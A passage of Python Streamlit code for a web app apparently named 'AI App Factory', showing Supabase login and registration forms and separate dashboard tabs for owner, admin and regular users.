if not st.session_state.user:
    st.markdown("<h1 style='text-align: center; color: #4B4B4B;'>⚡ AI App Factory</h1>", unsafe_allow_html=True)
    col1, col2, col3 = st.columns([1, 2, 1])
    with col2:
        tab1, tab2 = st.tabs(["🔐 Login", "📝 Register"])
        with tab1:
            with st.form("login_form"):
                email = st.text_input("Email Address")
                password = st.text_input("Password", type="password")
                if st.form_submit_button("Login to Dashboard", use_container_width=True): login(email, password)
        with tab2:
            with st.form("register_form"):
                reg_email = st.text_input("Email Address")
                reg_password = st.text_input("Password", type="password")
                reg_confirm = st.text_input("Confirm Password", type="password")
                if st.form_submit_button("Create Account", use_container_width=True):
                    if reg_password == reg_confirm and len(reg_password) >= 6: register(reg_email, reg_password)
                    else: st.error("Passwords do not match or too short.")
else:
    st.sidebar.title(f"Hi, {st.session_state.user.email}")
    st.sidebar.info(f"🔑 Role: **{st.session_state.role.upper()}**\n\n📦 Pkg: **{st.session_state.package.upper()}**")
    
    if st.sidebar.button("Logout", type="primary"):
        supabase.auth.sign_out()
        st.session_state.user = None; st.session_state.role = None; st.session_state.package = 'free'; st.session_state.expires_at = None
        st.rerun()

    if st.session_state.role == 'owner':
        st.title("👑 Owner Dashboard")
        tab1, tab2, tab3, tab4, tab5 = st.tabs(["🚀 Generator", "💰 Approvals", "⚡ God Mode", "📱 Global Apps", "⚙️ Admin Settings"])
        with tab1: render_generator_dashboard()
        with tab2: render_payment_approvals()
        with tab3: render_god_mode()
        with tab4: render_admin_app_management()
        with tab5: render_admin_settings()
            
    elif st.session_state.role == 'admin':
        st.title("🛡️ Admin Dashboard")
        tab1, tab2, tab3 = st.tabs(["🚀 Generator", "💰 Approvals", "📱 Global Apps"])
        with tab1: render_generator_dashboard()
        with tab2: render_payment_approvals()
        with tab3: render_admin_app_management()
        
    elif st.session_state.role in ['user', 'moderator']:
        st.title("🚀 User Dashboard")
        tab1, tab2 = st.tabs(["🚀 App Generator", "💳 Upgrade Package"])
        with tab1: render_generator_dashboard()
        with tab2: render_upgrade_section()
